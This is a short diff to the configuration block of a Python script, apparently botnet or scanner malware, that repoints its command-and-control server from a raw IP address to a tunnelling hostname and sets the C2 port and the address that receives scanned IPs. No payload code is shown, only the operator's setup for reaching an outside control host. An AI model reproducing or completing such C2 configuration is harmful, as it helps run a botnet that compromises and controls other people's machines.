@@ -24,7 +24,7 @@ import random
 import threading
 import base64 as b64
 #config
-cnc                  = "147.185.221.180"#your cnc ip
+cnc                  = "180.ip.ply.gg"#your cnc ip
 cport                = 28393#your cnc port
 scan_ip              = "127.0.0.1"#Recevie the scanned ip
 scan_port            = 911#same
